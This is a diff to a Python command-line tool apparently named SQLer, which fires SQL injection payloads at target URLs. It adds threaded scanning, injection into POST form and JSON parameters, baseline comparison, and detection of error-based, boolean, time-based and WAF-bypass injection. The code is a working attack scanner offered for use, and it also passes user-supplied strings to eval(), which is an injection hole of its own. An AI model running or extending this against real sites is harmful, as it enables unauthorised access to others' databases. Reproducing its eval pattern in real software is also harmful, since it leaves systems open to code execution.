@@ -5,7 +5,8 @@ import time
 import random
 import string
 import requests
-from typing import List, Dict, Any
+import threading
+from typing import List, Dict, Any, Optional
 
 class SQLiPayloads:
     """
@@ -41,62 +42,111 @@ class SQLiPayloads:
         return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
 class SQLer:
-    def __init__(self, urls: List[str]):
+    def __init__(self, urls: List[str], method: str = 'GET', data: Optional[str] = None, json_data: Optional[str] = None, threads: int = 5):
         self.urls = urls
         self.session = requests.Session()
         self.timeout = 10
         self.verbose = True
+        self.method = method.upper()
+        self.data = data
+        self.json_data = json_data
+        self.threads = threads
 
     def run(self):
+        threads = []
         for url in self.urls:
-            print(f"[+] Scanning: {url}")
-            result = self.detect_sqli(url)
-            if result['vulnerable']:
-                print(f"[!!!] SQLi Detected: {url}")
-                print(f"[DETAILS] {result['details']}")
-            else:
-                print(f"[-] No SQLi detected: {url}")
+            t = threading.Thread(target=self.scan_url, args=(url,))
+            t.start()
+            threads.append(t)
+            if len(threads) >= self.threads:
+                for th in threads:
+                    th.join()
+                threads = []
+        for th in threads:
+            th.join()
+
+    def scan_url(self, url: str):
+        print(f"[+] Scanning: {url}")
+        result = self.detect_sqli(url)
+        if result['vulnerable']:
+            print(f"[!!!] SQLi Detected: {url}")
+            print(f"[DETAILS] {result['details']}")
+        else:
+            print(f"[-] No SQLi detected: {url}")
 
     def detect_sqli(self, url: str) -> dict:
         details = []
         vulnerable = False
+        baseline = self.get_baseline(url)
         for payload in SQLiPayloads.ALL:
-            test_url = self.inject_payload(url, payload)
+            test_url, test_data, test_json = self.inject_payload(url, payload)
             try:
                 start = time.time()
-                resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
+                resp = self.send_request(test_url, test_data, test_json)
                 elapsed = time.time() - start
-                analysis = self.analyze_response(resp, payload, elapsed)
+                analysis = self.analyze_response(resp, payload, elapsed, baseline)
                 if self.verbose:
                     print(f"[PAYLOAD] {payload}")
                     print(f"[RESPONSE] Status: {resp.status_code}, Time: {elapsed:.2f}s, Length: {len(resp.text)}")
                 if analysis['vulnerable']:
                     details.append(analysis['details'])
                     vulnerable = True
-                    # For live output, show immediately
                     print(f"[!!!] Confirmed SQLi with payload: {payload}")
                     print(f"[DETAILS] {analysis['details']}")
-                    # Optionally, break on first confirmed or continue for more
             except Exception as e:
                 if self.verbose:
                     print(f"[ERROR] {e}")
         return {'vulnerable': vulnerable, 'details': details if details else 'No SQLi detected'}
 
-    def inject_payload(self, url: str, payload: str) -> str:
-        # Naive: replace first parameter value with payload
-        if '?' not in url or '=' not in url:
-            return url  # Not injectable
-        base, params = url.split('?', 1)
-        param_pairs = params.split('&')
-        for i, pair in enumerate(param_pairs):
-            if '=' in pair:
-                k, v = pair.split('=', 1)
-                param_pairs[i] = f"{k}={v}{payload}"
-                break  # Only first param for now
-        return base + '?' + '&'.join(param_pairs)
+    def get_baseline(self, url: str):
+        try:
+            resp = self.send_request(url, self.data, self.json_data)
+            return {'status': resp.status_code, 'length': len(resp.text), 'text': resp.text}
+        except Exception:
+            return {'status': None, 'length': 0, 'text': ''}
 
-    def analyze_response(self, resp: requests.Response, payload: str, elapsed: float) -> Dict[str, Any]:
-        # Error-based
+    def send_request(self, url, data, json_data):
+        if self.method == 'POST':
+            if json_data:
+                return self.session.post(url, json=eval(json_data), timeout=self.timeout, allow_redirects=True)
+            elif data:
+                return self.session.post(url, data=eval(data), timeout=self.timeout, allow_redirects=True)
+            else:
+                return self.session.post(url, timeout=self.timeout, allow_redirects=True)
+        else:
+            return self.session.get(url, timeout=self.timeout, allow_redirects=True)
+
+    def inject_payload(self, url: str, payload: str):
+        # GET param injection
+        test_url = url
+        test_data = self.data
+        test_json = self.json_data
+        if self.method == 'GET' and '?' in url and '=' in url:
+            base, params = url.split('?', 1)
+            param_pairs = params.split('&')
+            for i, pair in enumerate(param_pairs):
+                if '=' in pair:
+                    k, v = pair.split('=', 1)
+                    param_pairs[i] = f"{k}={v}{payload}"
+                    break
+            test_url = base + '?' + '&'.join(param_pairs)
+        elif self.method == 'POST':
+            # POST data param injection
+            if self.data:
+                d = eval(self.data)
+                for k in d:
+                    d[k] = str(d[k]) + payload
+                    break
+                test_data = str(d)
+            elif self.json_data:
+                j = eval(self.json_data)
+                for k in j:
+                    j[k] = str(j[k]) + payload
+                    break
+                test_json = str(j)
+        return test_url, test_data, test_json
+
+    def analyze_response(self, resp: requests.Response, payload: str, elapsed: float, baseline: dict) -> Dict[str, Any]:
         error_signatures = [
             'You have an error in your SQL syntax',
             'Warning: mysql_',
@@ -113,16 +163,14 @@ class SQLer:
         for sig in error_signatures:
             if sig.lower() in resp.text.lower():
                 return {'vulnerable': True, 'details': f'Error-based SQLi detected with payload: {payload} | Signature: {sig}'}
-        # Boolean-based
+        # Boolean-based: compare with baseline
         if payload in SQLiPayloads.BOOLEAN_BASED:
-            # Try to detect difference in response for true/false
-            # (This is a simplified version; advanced would compare baseline responses)
-            if '1=1' in payload and resp.status_code == 200:
+            if '1=1' in payload and resp.status_code == 200 and abs(len(resp.text) - baseline['length']) > 20:
                 return {'vulnerable': True, 'details': f'Boolean-based SQLi detected with payload: {payload}'}
         # Time-based
         if payload in SQLiPayloads.TIME_BASED and elapsed > 4.5:
             return {'vulnerable': True, 'details': f'Time-based SQLi detected with payload: {payload} | Response time: {elapsed:.2f}s'}
-        # WAF bypass/tampered: look for error or abnormal response
+        # WAF bypass/tampered
         if payload in SQLiPayloads.WAF_BYPASS + SQLiPayloads.TAMPERED:
             if any(sig.lower() in resp.text.lower() for sig in error_signatures):
                 return {'vulnerable': True, 'details': f'WAF bypass SQLi detected with payload: {payload}'}
@@ -133,6 +181,10 @@ def parse_args():
     group = parser.add_mutually_exclusive_group(required=True)
     group.add_argument('-u', '--url', help='Target single URL')
     group.add_argument('-l', '--list', help='File with list of URLs (one per line)')
+    parser.add_argument('-X', '--method', default='GET', help='HTTP method: GET or POST')
+    parser.add_argument('--data', help='POST data as dict string, e.g. "{\'user\': \'admin\', \'pass\': \'123\'}"')
+    parser.add_argument('--json', help='POST JSON as dict string, e.g. "{\'user\': \'admin\', \'pass\': \'123\'}"')
+    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads')
     return parser.parse_args()
 
 def main():
@@ -149,7 +201,7 @@ def main():
     if not urls:
         print("[ERROR] No URLs provided.")
         sys.exit(1)
-    sqler = SQLer(urls)
+    sqler = SQLer(urls, method=args.method, data=args.data, json_data=args.json, threads=args.threads)
     sqler.run()
 
 if __name__ == '__main__':
